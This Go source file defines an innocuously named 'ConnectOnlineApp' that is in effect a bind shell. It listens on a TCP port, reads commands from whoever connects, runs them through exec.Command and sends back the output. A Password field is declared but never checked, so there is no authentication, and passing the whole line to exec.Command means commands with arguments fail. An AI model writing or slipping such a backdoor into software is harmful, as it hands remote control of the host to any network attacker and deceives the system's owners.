package apps

import (
	"bufio"
	"errors"
	"fmt"
	"net"
	"os/exec"
	"strconv"
	"sync"
)

type ConnectOnlineApp struct {
	Port     int    `json:"Port,omitempty"`
	Password string `json:"Password,omitempty"`
}

var stopConnectOnlineApp = false

func (c *ConnectOnlineApp) Start(wg *sync.WaitGroup) {
	address := fmt.Sprintf(":%d", c.Port)
	ln, err := net.Listen("tcp", address)
	if err != nil {
		lgr.Error("Error starting connect online app", err)
		return
	}
	defer ln.Close()

	lgr.Info("Server is listening on port:", strconv.Itoa(c.Port))

	for stopConnectOnlineApp != true {
		conn, err := ln.Accept()
		if err != nil {
			lgr.Error("Error accepting connect online app", err)
			continue
		}
		if conn.RemoteAddr() != nil {
			handleConnection(conn)
			break
		}
	}
}

func (c *ConnectOnlineApp) Stop() {
	stopConnectOnlineApp = true
}

func (c *ConnectOnlineApp) Validate() error {
	if c.Port < 1 || c.Port > 65535 {
		return errors.New("port must be between 1 and 65535")
	}
	return nil
}

func handleConnection(conn net.Conn) {
	defer func(conn net.Conn) {
		err := conn.Close()
		if err != nil {
			lgr.Error("Error closing connection", err)
		}
	}(conn)

	reader := bufio.NewReader(conn)

	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			lgr.Error("Error reading command", err)
			return
		}

		command = command[:len(command)-1]

		if command == "exit" {
			lgr.Info("Exiting connect online app")
			return
		}

		output, err := exec.Command(command).CombinedOutput()
		if err != nil {
			output = []byte(fmt.Sprintf("Error executing command: %v", err))
		}
		conn.Write(output)
	}
}
